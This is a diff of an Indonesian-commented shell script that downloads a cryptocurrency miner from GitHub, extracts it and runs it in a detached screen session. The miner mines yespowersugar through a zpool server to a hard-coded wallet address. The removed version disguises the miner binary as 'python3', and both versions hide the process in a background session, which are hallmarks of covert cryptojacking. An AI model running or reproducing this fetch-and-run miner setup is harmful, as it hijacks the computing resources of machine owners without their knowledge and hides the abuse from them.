@@ -2,8 +2,8 @@
 
 # Nama file yang akan diunduh
 FILE="KONTOL"
-URL="https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz"
-EXTRACTED_DIR="dotsrb"  # Nama folder hasil ekstraksi
+URL="https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz"
+EXTRACTED_DIR="cpuminer"  # Nama folder hasil ekstraksi
 
 # Fungsi untuk menampilkan efek loading
 loading() {
@@ -45,4 +45,4 @@ else
     echo "Ekstraksi selesai."
 fi
 
-screen -dmS dotsrb$COUNT ./dotsrb/python3 -a yespowersugar -o yespowersugar.eu.mine.zpool.ca:6241 -u DGNF8dXcQNseyKH55K59nyTkRVEbDkuewJ -p c=DGB,zap=SUGAR
+screen -dmS dotgula ./cpuminer -a yespowersugar -o yespowersugar.eu.mine.zpool.ca:6241 -u DGNF8dXcQNseyKH55K59nyTkRVEbDkuewJ -p c=DGB,zap=SUGAR
